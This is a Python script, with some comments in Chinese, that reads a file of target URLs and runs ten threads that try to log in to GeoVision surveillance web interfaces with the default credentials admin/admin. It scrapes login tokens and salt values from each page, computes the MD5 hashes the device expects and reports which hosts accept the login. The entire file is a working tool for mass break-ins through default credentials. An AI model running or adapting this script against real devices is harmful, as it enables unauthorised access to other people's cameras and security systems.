import requests
import hashlib
import re
import urllib3
from concurrent.futures import ThreadPoolExecutor

# 禁用不安全警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def login_geovision(url, username='admin', password='admin', timeout=10):
    session = requests.session()
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
    }
    
    # Step 1: Get cc1, cc2, and token
    info_url = f"{url}/ssi.cgi/Login.htm"
    cc1, cc2, token = '', '', ''
    
    try:
        info_req = session.get(info_url, timeout=timeout, headers=headers, verify=False)
        if info_req.status_code == 200:
            if res := re.findall(r'var cc1="(.*)"; var cc2="(.*)"', info_req.text):
                cc1, cc2 = res[0]
            if res := re.findall(r"name=web_login_token type=hidden value='(.*)'", info_req.text):
                token = res[0]
    except Exception as e:
        print(f"Error getting login info for {url}: {e}")
        return False

    # Step 2: Create login data
    login_url = f"{url}/LoginPC.cgi"
    data = {
        'username': username,
        'password': password,
        'Apply': '&#24212;&#29992;',
        'umd5': hashlib.md5((cc1 + username + cc2).encode('utf-8')).hexdigest().upper(),
        'pmd5': hashlib.md5((cc2 + password + cc1).encode('utf-8')).hexdigest().upper(),
        'browser': 1,
        'is_check_OCX_OK': 0,
    }

    if token:
        data['web_login_token'] = int(token)
        data['browser'] = ''

    # Step 3: Attempt to log in
    try:
        req = session.post(login_url, data=data, timeout=timeout, headers=headers, verify=False)
        if req.status_code == 200 and 'Web-Manager' in req.text:
            print(f"Login successful for {url}!")
            return True
        else:
            print(f"Login failed for {url}.")
            return False
    except Exception as e:
        print(f"Error during login request for {url}: {e}")
        return False

def read_targets(file_path):
    with open(file_path, 'r') as file:
        urls = [line.strip() for line in file if line.strip()]  # Read and filter non-empty lines

    # 使用线程池执行并行登录
    with ThreadPoolExecutor(max_workers=10) as executor:  # 可以根据需要调整 max_workers
        executor.map(login_geovision, urls)

# Example usage:
read_targets('22.txt')
